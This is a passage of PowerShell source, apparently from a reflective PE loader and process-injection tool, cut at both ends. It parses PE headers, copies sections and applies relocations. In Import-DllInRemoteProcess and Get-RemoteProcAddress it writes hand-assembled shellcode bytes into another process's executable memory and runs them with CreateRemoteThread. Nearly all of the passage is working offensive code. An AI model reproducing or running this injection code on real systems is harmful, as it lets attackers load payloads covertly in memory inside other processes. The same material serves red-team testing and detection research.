        $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

        #Get IMAGE_NT_HEADERS
        [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
        $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
        $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
        
        #Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
        if ($imageNtHeaders64.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }
        
        if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }
        
        return $NtHeadersInfo
    }


    #This function will get the information needed to allocated space in memory for the PE
    Function Get-PEBasicInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $PEInfo = New-Object System.Object
        
        #Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
        [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
        
        #Get NtHeadersInfo
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
        
        #Build a structure with the information which will be needed for allocating memory and writing the PE to memory
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
        
        #Free the memory allocated above, this isn't where we allocate the PE to memory
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
        
        return $PEInfo
    }


    #PEInfo must contain the following NoteProperties:
    #   PEHandle: An IntPtr to the address the PE is loaded to in memory
    Function Get-PEDetailedInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }
        
        $PEInfo = New-Object System.Object
        
        #Get NtHeaders information
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
        
        #Build the PEInfo object
        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        
        if ($PEInfo.PE64Bit -eq $true)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        else
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        
        if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }
        
        return $PEInfo
    }
    
    
    Function Import-DllInRemoteProcess
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $ImportDllPathPtr
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
        $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
        $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RImportDllPathPtr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
        
        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($DllPathSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }
        
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
        
        [IntPtr]$DllAddress = [IntPtr]::Zero
        #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
        #   Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
        if ($PEInfo.PE64Bit -eq $true)
        {
            #Allocate memory for the address returned by LoadLibraryA
            $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }
            
            
            #Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
            $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $LoadLibrarySC2 = @(0x48, 0xba)
            $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
            $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
            
            $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
            $SCPSMemOriginal = $SCPSMem
            
            Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

            
            $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($RSCAddr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }
            
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
            {
                Throw "Unable to write shellcode to remote process memory."
            }
            
            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            #The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
            [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
            $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
            if ($Result -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            [Int32]$ExitCode = 0
            $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
            if (($Result -eq 0) -or ($ExitCode -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }
            
            [IntPtr]$DllAddress = [IntPtr]$ExitCode
        }
        
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        
        return $DllAddress
    }
    
    
    Function Get-RemoteProcAddress
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $RemoteDllHandle,
        
        [Parameter(Position=2, Mandatory=$true)]
        [IntPtr]
        $FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        [IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
            $FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

            #Write FunctionName to memory (will be used in GetProcAddress)
            $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
            $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($RFuncNamePtr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process"
            }

            [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write DLL path to remote process memory"
            }
            if ($FunctionNameSize -ne $NumBytesWritten)
            {
                Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
            }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
        
        #Get address of GetProcAddress
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

        
        #Allocate memory for the address returned by GetProcAddress
        $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }
        
        
        #Write Shellcode to the remote process which will call GetProcAddress
        #Shellcode: GetProcAddress.asm
        [Byte[]]$GetProcAddressSC = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $GetProcAddressSC2 = @(0x48, 0xba)
            $GetProcAddressSC3 = @(0x48, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
            $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $GetProcAddressSC2 = @(0xb9)
            $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
            $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
        $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
        $SCPSMemOriginal = $SCPSMem
        
        Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
        
        $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($RSCAddr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }
        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
        if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
        {
            Throw "Unable to write shellcode to remote process memory."
        }
        
        $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
        $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
        if ($Result -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }
        
        #The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
        [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
        $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
        if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        
        return $ProcAddress
    }


    Function Copy-Sections
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
        
            #Address to copy the section to
            [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
            
            #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
            #    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
            #    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
            #    so truncate SizeOfRawData to VirtualSize
            $SizeOfRawData = $SectionHeader.SizeOfRawData

            if ($SectionHeader.PointerToRawData -eq 0)
            {
                $SizeOfRawData = 0
            }
            
            if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
            {
                $SizeOfRawData = $SectionHeader.VirtualSize
            }
            
            if ($SizeOfRawData -gt 0)
            {
                Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
            }
        
            #If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
            if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
            {
                $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
                [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
                Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
                $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
            }
        }
    }


    Function Update-MemoryAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $OriginalImageBase,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        [Int64]$BaseDifference = 0
        $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
        [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
        
        #If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
        if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


        elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
            $AddDifference = $false
        }
        elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
        }
        
        #Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
        [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            #If SizeOfBlock == 0, we are done
            $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

            if ($BaseRelocationTable.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
            $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

            #Loop through each relocation
            for($i = 0; $i -lt $NumRelocations; $i++)
            {
                #Get info for this relocation
                $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
                [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

                #First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
                [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
                [UInt16]$RelocType = $RelocationInfo -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $RelocType = [Math]::Floor($RelocType / 2)
                }

                #For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
                #This appears to be true for EXE's as well.
                #   Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
                if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {           
                    #Get the current memory address and update it based off the difference between PE expected base address and actual base address
                    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
        
                    if ($AddDifference -eq $true)
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }
                    else
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }               

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                }
                elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    #IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
                    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
                }
            }
            
            $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
        }
    }


    Function Import-DllImports
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )
        
        $RemoteLoading = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $RemoteLoading = $true
        }
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
